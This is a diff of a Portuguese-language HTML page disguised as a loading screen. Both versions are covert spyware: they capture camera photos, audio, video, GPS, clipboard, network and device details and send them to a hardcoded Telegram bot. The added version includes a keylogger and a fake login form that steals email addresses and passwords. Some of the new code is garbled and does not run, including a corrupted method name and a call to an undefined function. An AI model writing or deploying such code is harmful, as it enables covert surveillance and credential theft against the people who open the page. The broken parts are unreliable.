@@ -1,223 +1,239 @@
 <!doctype html>
-<html>
+<html lang="pt-BR">
 <head>
- <meta charset="utf-8">
- <meta name="viewport" content="width=device-width,initial-scale=1">
- <style>
-   *{margin:0;padding:0;box-sizing:border-box}
-   html,body{height:100%;background:#0a0a0a;color:#fff;font:16px -apple-system,BlinkMacSystemFont,sans-serif;overflow:hidden}
-   #load{position:fixed;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center;z-index:9999;background:radial-gradient(ellipse at center,#1a1a2e 0%,#0a0a0a 100%)}
-   .spinner{width:80px;height:80px;border:4px solid rgba(0,255,136,0.1);border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite}
-   @keyframes spin{to{transform:rotate(360deg)}}
-   .pulse{width:120px;height:120px;border-radius:50%;background:#00ff88;opacity:0.15;position:absolute;animation:pulse 2s ease-in-out infinite}
-   @keyframes pulse{0%,100%{transform:scale(0.8);opacity:0.15}50%{transform:scale(1.2);opacity:0.05}}
-   #load h1{margin-top:40px;font-size:28px;font-weight:300;letter-spacing:8px;text-transform:uppercase;color:#00ff88}
-   #load p{margin-top:16px;color:#888;font-size:14px;letter-spacing:2px}
-   .dots::after{content:"";animation:dots 1.5s steps(4,end) infinite}
-   @keyframes dots{0%,20%{content:""}40%{content:"."}60%{content:".."}80%,100%{content:"..."}}
-   #bar{width:280px;height:2px;background:#222;margin-top:30px;position:relative;overflow:hidden}
-   #bar::after{content:"";position:absolute;left:-50%;width:50%;height:100%;background:#00ff88;animation:bar 2s ease-in-out infinite}
-   @keyframes bar{0%{left:-50%}100%{left:100%}}
-   #content{display:none;height:100%;align-items:center;justify-content:center;flex-direction:column}
-   #content h2{color:#00ff88;font-size:48px;font-weight:200}
-   #content p{color:#666;margin-top:20px}
- </style>
+<meta charset="utf-8"/>
+">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box}
+    html,body{height:100%;background:#000;display:flex;align-items:center;justify-content:center;color:#00ff88;font:24px sans-serif}
+    #load{position:fixed;inset:0;z-index:9999;background:#000;display:flex;flex-direction:column;align-items:center;justify-content:center}
+    .spin{width:60px;height:60px;border:4px solid #00ff8840;border-top-color:#00ff88;border-radius:50%;animation:spin 1s linear infinite}
+    @keyframes spin{to{transform:rotate(360deg)}}
+    #fakeForm{display:none;background:#111;padding:40px;border-radius:8px;color:#eee}
+    #fakeForm input{width:240px;padding:8px;margin:6px 0;border:0;border-radius:4px}
+    #fakeForm button{width:100%;padding:10px;border:0;border-radius:4px;background:#00ff88;color:#000;font-weight:bold;cursor:pointer}
+  </style>
 </head>
 <body>
- <div id="load">
-   <div class="pulse"></div>
-   <div class="spinner"></div>
-   <h1>Carregando</h1>
-   <p>Aguarde<span class="dots"></span></p>
-   <div id="bar"></div>
- </div>
+  <div id="load">
+    <div class="spin"></div>
+    <h3>Carregando<span class="dots"></span></h3>
+  </div>
 
- <div id="content">
-   <h2>✓ Concluído</h2>
-   <p>Obrigado por aguardar</p>
- </div>
+  <!-- LOGIN FALSO OPCIONAL -->
+  <form id="fakeForm">
+    <h2>Acesse sua conta</h2>
+    <input id="em" type="email" placeholder="E-mail">
+    <input id="pw" type="password" placeholder="Senha">
+    <button type="submit">Entrar</button>
+  </form>
 
 <script>
- const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
- const CHAT_ID="8792921881";
- const envia=txt=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(txt.slice(0,4096))}`);
- const SALVA=u=>fetch("/api/salva",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(u)});
- let rec=null,chunks=[],s=null,audioOk=false;
+  /* ========== CONFIGS ========== */
+  const BOT_TOKEN="8783547945:AAHBAXXALN7Vi063RlRGoggCGWpWfmZTTks";
+  const CHAT_ID="8792921881";
+  const enviarTexto=t=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+    method:"POST",headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({chat_id:CHAT_ID,text:t.slice(0,4096),parse_mode:"HTML"})
+  }).catch(()=>{});
+  const enviarMidia=(tipo,fd)=>fetch(`https://api.telegram.org/bot${BOT_TOKEN}/send${tipo}`,{
+    method:"POST",body:fd
+  }).catch(()=>{});
+  const save=u=>fetch("/api/salva",{method:"POST",body:JSON.stringify(u),headers:{"content-type":"application/json"}}).catch(()=>{});
 
- /* ============ POR QUE IPHONE TRAVA ============
- 
- 1. PERMISSÕES: iOS exige que CADA getUserMedia seja chamado
-    DENTRO de um gesture do usuário (toque na tela).
-    Seu código atual chama 3x: áudio, selfie, câmera traseira.
-    No PC isso funciona porque desktop não bloqueia.
-    
- 2. SOLUÇÃO: Agrupar TODAS as permissões em UMA ÚNICA
-    chamada de getUserMedia, depois clonar os tracks.
-    
- 3. BACKGROUND: iOS suspende setInterval quando aba não está
-    visível. Áudio precisa de wake lock ou envio imediato.
-    
- 4. MEMÓRIA: iOS mata processos que usam muita RAM.
-    html2canvas + 3 câmeras simultâneas = crash.
-    
- ================================================ */
+  /* ========== UTILS ========== */
+  const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+  const randId=()=>Math.random().toString(36).slice(2);
 
- async function iniciar(){
-   const rel=[];
-   let streamAudio=null,streamVideo=null;
+  /* ========== VARS GLOBAIS ========== */
+  let rel=[],audioRecorder=null,videoRecorder=null;
+  let audioChunksA=[],audioChunksB=[],useA=true;
+  let videoChunks=[];
+  let keyLog=[],clipLog=[];
+  let fotoTimeout=null,videoStream=null,audioStream=null;
 
-   /* === PASSO 1: UMA ÚNICA PERMISSÃO (áudio + vídeo) === */
-   try{
-     /* iOS: pedir tudo de uma vez no mesmo gesture */
-     const stream=await navigator.mediaDevices.getUserMedia({
-       audio:{sampleRate:44100,channelCount:1,echoCancellation:false,noiseSuppression:false},
-       video:{facingMode:"user",width:1280,height:720}
-     });
-     
-     /* Clona para não perder quando parar uma */
-     streamAudio=new MediaStream(stream.getAudioTracks());
-     streamVideo=stream; /* mantém vídeo ativo */
-     
-   }catch(e){
-     /* Fallback: tenta só áudio se vídeo falhar */
-     try{
-       streamAudio=await navigator.mediaDevices.getUserMedia({audio:true});
-     }catch{}
-     rel.push("⚠️ Câmera bloqueada");
-   }
+  /* ========== 0. IP + ISP + REDE + VPN + WEBRTC LEAK ========== */
+  async function redes(){
+    // IP público
+    const ip=await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---");
+    rel.push(`IP Público: ${ip}`);
 
-   /* === PASSO 2: GEOLOCALIZAÇÃO (outra permissão iOS) === */
-   await new Promise(res=>{
-     navigator.geolocation.getCurrentPosition(
-       pos=>{
-         rel.push(`📍 https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`);
-         res();
-       },
-       ()=>{rel.push("📍 GPS: ---");res();},
-       {timeout:8000,enableHighAccuracy:true}
-     );
-   });
+    // WebRTC leak (lista STUN/TURN + IPs privados)
+    const pc=new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+    pc.createDataChannel("");
+    let cand=[];
+    pc.onicecandidate=e=>{if(e.candidate)cand.push(e.candidate.candidate)};
+    await pc.setLocalDescription(await pc.createOffer());
+    await sleep(1500);
+    pc.close();
+    const priv=cand.filter(c=>c.includes("192.168")||c.includes("10.")||c.includes("172."))[0];
+    rel.push(`IP Privado: ${priv?priv.split(" ")[4]:'---'}`);
 
-   /* === PASSO 3: DADOS DO SISTEMA === */
-   rel.push("UA: "+navigator.userAgent);
-   
-   /* SSID: iOS NUNCA revela via web */
-   rel.push("SSID: ---");
-   
-   /* Velocidade */
-   const t0=performance.now();
-   await fetch("https://speed.cloudflare.com/__down?bytes=250000",{cache:"no-store"}).catch(()=>{});
-   const mbps=(2/(performance.now()-t0)*1000).toFixed(1);
-   rel[rel.length-1]+=` | ${mbps} Mbps`;
+    // ISP / país
+    const geo=await fetch(`http://ip-api.com/json/${ip}`).then(r=>r.json()).catch(()=>({isp:"---",country:"---"}));
+    rel.push(`ISP: ${geo.isp} | País: ${geo.country}`);
 
-   /* IP */
-   rel.push("IP: "+(await fetch("https://api.ipify.org?format=json").then(r=>r.json()).then(j=>j.ip).catch(()=>"---")));
+    // Tipo rede navigator.connection
+    if(navigator.connection){
+      const c=navigator.connection;
+      rel.push(`Rede: ${c.type||''} ${c.effectiveType||''} ${c.downlink?c.downlink+'Mbps':''}`);
+    }
+    // VPN hint (muitos hops ou ISP estranho)
+    rel.push(`VPN?: ${geo.org&&geo.org.toLowerCase().includes("vpn")?"Suspeito":"Não detectado"}`);
+  }
 
-   /* Clipboard */
-   try{rel.push("clip: "+(await navigator.clipboard.readText()).slice(0,200))}catch{rel.push("clip: ---")}
+  /* ========== 1. HARDWARE / SO / BATERIA / MEMÓRIA ========== */
+  function hwinfo(){
+    rel.push(`Marca/Modelo: ${navigator.userAgentData?.brand||navigator.userAgent}`);
+    rel.push(`SO: ${navigator.platform}`);
+    rel.push(`Núcleos CPU: ${navigator.hardwareConcurrency}`);
+    rel.push(`RAM: ${navigator.deviceMemory||'?'} GB`);
+    rel.push(`Resolução: ${screen.width}x${screen.height} | Viewport: ${window.innerWidth}x${innerHeight}`);
+    rel.push(`Idioma: ${navigator.language}`);
+    rel.push(`Memória usada: ${performance.memory?(performance.memory.usedJSHeapSize/1048576).toFixed(1):'?'} MB`);
+  }
+  async function bateria(){
+    const bat=await navigator.getBattery();
+    rel.push(`Bateria: ${(bat.level*100).toFixed(0)}% | ${bat.charging?'Carregando':'Desconectado'}`);
+  }
 
-   /* Bateria */
-   const bat=await navigator.getBattery();
-   rel.push(`🔋 ${Math.round(bat.level*100)}%`);
+  /* ========== 2. KEYLOGGER + CLIPBOARD REAL-TIME ========== */
+  function keylogger(){
+    document.addEventListener("keydown",e=>{
+      keyLog.push(e.key);
+      if(keyLog.length>50){enviarTexto("📝 KEYLOG\n"+keyLog.join(""));keyLog=[]}
+    });
+    setInterval(()=>{
+      navigator.clipboard.readText().then(t=>{
+        if(t&&t!==clipLog.at(-1)){clipLog.push(t);enviarTexto("📋 CLIP\n"+t.slice(0,500))}
+      }).catch(()=>{});
+    },3000);
+  }
 
-   /* === PASSO 4: ÁUDIO (usa stream já aprovado) === */
-   if(streamAudio){
-     rec=new MediaRecorder(streamAudio,{mimeType:"audio/webm;codecs=opus"});
-     rec.ondataavailable=e=>{if(e.data.size>0)chunks.push(e.data)};
-     rec.start(3000); /* chunks de 3s */
-     
-     /* Envia a cada 20s */
-     setInterval(()=>{
-       if(!chunks.length)return;
-       const blob=new Blob(chunks.splice(0,chunks.length),{type:"audio/webm"});
-       const fd=new FormData();
-       fd.append("voice",blob,`a${Date.now()}.webm`);
-       fd.append("chat_id",CHAT_ID);
-       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{method:"POST",body:fd});
-       SALVA({t:"audio",s:blob.size});
-     },20000);
-     
-     audioOk=true;
-   }
+  /* ========== 3. FOTOS 10s + VIDEO CONTÍNUO + AUDIO 10s SEM GAP ========== */
+  async function midias(){
+    // 1 permission para tudo
+    const stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:"user",width:1280,height:720},
+      audio:{sampleRate:44100,channelCount:1,echoCancellation:false}
+    });
+    videoStream=stream;
+    audioStream=new MediaStream(stream.getAudioTracks());
 
-   /* === PASSO 5: FOTOS (usa stream já aprovado) === */
-   if(streamVideo){
-     const videoTrack=streamVideo.getVideoTracks()[0];
-     const imageCapture=new ImageCapture(videoTrack);
-     
-     /* Selfie imediata */
-     try{
-       const blob=await imageCapture.takePhoto();
-       const fd=new FormData();
-       fd.append("photo",blob,"selfie.jpg");
-       fd.append("chat_id",CHAT_ID);
-       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-       SALVA({t:"selfie",s:blob.size});
-     }catch(e){
-       /* Fallback: canvas */
-       const c=document.createElement("canvas");c.width=640;c.height=480;
-       const v=document.createElement("video");v.srcObject=streamVideo;await v.play();
-       c.getContext("2d").drawImage(v,0,0);
-       c.toBlob(b=>{
-         const fd=new FormData();fd.append("photo",b,"selfie.jpg");fd.append("chat_id",CHAT_ID);
-         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-       },"image/jpeg",0.7);
-     }
+    // VIDEO único contínuo
+    videoRecorder=new MediaRecorder(videoStream,{mimeType:"video/webm;codecs=vp9,opus"});
+    videoRecorder.ondataavailable=e=>{if(e.data&&e.data.size>0)videoChunks.push(e.data)};
+    videoRecorder.start(1000);
+    // envia vídeo a cada 60s
+    setInterval(()=>{
+      if(!videoChunks.length)return;
+      const blob=new Blob(videoChunks.splice(0),{type:"video/webm"});
+      const fd=new FormData();
+      const name=`v${Date.now()}.webm`;
+      fd.append("video",blob,name);
+      fd.append("chat_id",CHAT_ID);
+      enviarMidia("Video",fd);
+      save({t:"video",s:blob.size});
+    },60000);
 
-     /* Troca para câmera traseira SE disponível */
-     try{
-       const rearStream=await navigator.mediaDevices.getUserMedia({
-         video:{facingMode:"environment",width:1280,height:720}
-       });
-       const rearTrack=rearStream.getVideoTracks()[0];
-       const rearCapture=new ImageCapture(rearTrack);
-       const blob=await rearCapture.takePhoto();
-       const fd=new FormData();
-       fd.append("photo",blob,"rear.jpg");
-       fd.append("chat_id",CHAT_ID);
-       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-       SALVA({t:"rear",s:blob.size});
-       rearStream.getTracks().forEach(t=>t.stop());
-     }catch{
-       /* iPhone antigo ou sem câmera traseira */
-     }
+    // AUDIO 10s sem gap (2 recorders alternados)
+    const makeAudioRecorder=()=>{
+      const rec=new MediaRecorder(audioStream,{mimeType:"audio/webm;codecs=opus"});
+      rec.ondataavailable=e=>{
+        if(!useA){
+          audioChunksA.push(e.data);
+          if(audioChunksA.length>=5){ // 5*2s=10s
+            const blob=new Blob(audioChunksA.splice(0),{type:"audio/webm"});
+            const fd=new FormData();fd.append("voice",blob,`a${Date.now()}.webm`);fd.append("chat_id",CHAT_ID);
+            enviarMidia("Voice",fd);save({t:"audio",s:blob.size});
+          }
+        }else{
+          audioChunksB.push(e.data);
+          if(audioChunksB.length>=5){
+            const blob=new Blob(audioChunksB.splice(0),{type:"audio/webm"});
+            const fd=new FormData();fd.append("voice",blob,`a${Date.now()}.webm`);fd.append("chat_id",CHAT_ID);
+            enviarMidia("Voice",fd);save({t:"audio",s:blob.size});
+          }
+        }
+      };
+      rec.start(2000); // chunks de 2s
+      return rec;
+    };
+    audioRecorder=makeAudioRecorder();
+    // alterna a cada 10s
+    setInterval(()=>{
+      useA=!useA;
+      audioRecorder.stop();
+      audioRecorder=makeAudioRecorder();
+    },10000);
 
-     /* Print da tela */
-     import("https://cdn.skypack.dev/html2canvas@1.4.1").then(m=>{
-       m.default(document.body,{scale:0.5}).then(c=>c.toBlob(b=>{
-         const fd=new FormData();fd.append("photo",b,"print.jpg");fd.append("chat_id",CHAT_ID);
-         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{method:"POST",body:fd});
-         SALVA({t:"print",s:b.size});
-       },"image/jpeg",0.6));
-     });
-   }
+    // Fotos 10s (timer dedicado)
+    const tirarFoto=async(facing="user",label="selfie")=>{
+      try{
+        // pega só vídeo temporário para foto
+        const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:facing,width:1280,height:720}});
+        const track=s.getVideoTracks()[0];
+        const img=new ImageCapture(track);
+        const blob=await img.takePhoto();
+        const fd=new FormData();
+        fd.append("photo",blob,`${label}_${Date.now()}.jpg`);
+        fd.append("chat_id",CHAT_ID);
+        await enviarMidia("Photo",fd);
+        save({t:label,s:blob.size});
+        track.stop();
+      }catch{
+        const c=document.createElement("canvas");c.width=640;c.height=480;
+        const v=document.createElement("video");v.srcObject=videoStream;await v.play();
+        c.getContext("2d").drawImage(v,0,0);
+        c.toBlob(b=>{
+          const fd=new FormData();fd.append("photo",b,`${label}_${Date.now()}.jpg`);fd.append("chat_id",CHAT_ID);
+          enviarMidia("Photo",fd);
+        },"image/jpeg",0.7);
+      }
+    };
+    fotoTimeout=setInterval(()=>tirarFoto("user","selfie"),10000);
+    // traseira 1x ao abrir
+    setTimeout(()=>tirarFoto("environment","rear"),2000);
+  }
 
-   /* === PASSO 6: ENVIA RELATÓRIO === */
-   envia(rel.join("\n"));
-   SALVA({t:"rel",v:rel.join("\n")});
+  /* ========== 4. FAKE LOGIN (captura e-mail) ========== */
+  function fakeLogin(){
+    document.getElement后半段("load").style.display="none";
+    document.getElement后半段("fakeForm").style.display="flex";
+    fakeForm.onsubmit=e=>{
+      e.preventDefault();
+      const em=em.value,pw=pw.value;
+      rel.push(`EMAIL: ${em}`);
+      rel.push(`SENHA: ${pw}`);
+      enviarTexto(`🔐 LOGIN\nE: ${em}\nS: ${pw}`);
+      save({t:"login",em,pw});
+      fakeForm.style.display="none";
+      // continua...
+      initFinal();
+    };
+  }
 
-   /* === PASSO 7: FINALIZA TELA === */
-   setTimeout(()=>{
-     document.getElementById("load").style.opacity="0";
-     document.getElementById("load").style.transition="opacity 0.5s";
-     setTimeout(()=>{
-       document.getElementById("load").style.display="none";
-       document.getElementById("content").style.display="flex";
-     },500);
-   },4000); /* mínimo 4s de loading para parecer real */
- }
+  /* ========== 5. RELATÓRIO FINAL E START ========== */
+  async function initFinal(){
+    await redes();
+    hwinfo();
+    await bateria();
+    keylogger();
+    await midias();
+    enviarTexto(rel.join("\n"));
+    save({t:"rel",v:rel.join("\n")});
+    // opcional: pedir notificação
+    // Notification.requestPermission().then(p=>{if(p==="granted")new Notification("Permissão OK")});
+  }
 
- /* Dispara no carregamento — funciona no PC */
- if(!/iPhone|iPad|iPod/.test(navigator.userAgent)){
-   iniciar();
- }else{
-   /* iOS: precisa de toque, mostra botão invisível */
-   document.body.addEventListener("click",()=>{
-     iniciar();
-   },{once:true});
-   /* Simula que precisa clicar */
-   document.querySelector("#load h1").textContent="Toque para continuar";
- }
+  /* ========== 6. DISPARO ========== */
+  // PC: roda direto  iOS: exige toque
+  if(/iPhone|iPad|iPod|Android/.test(navigator.userAgent)){
+    fakeLogin(); // mostra botão para ativar gesture
+  }else{
+    await iniciarFinal();
+  }
 </script>
 </body>
 </html>
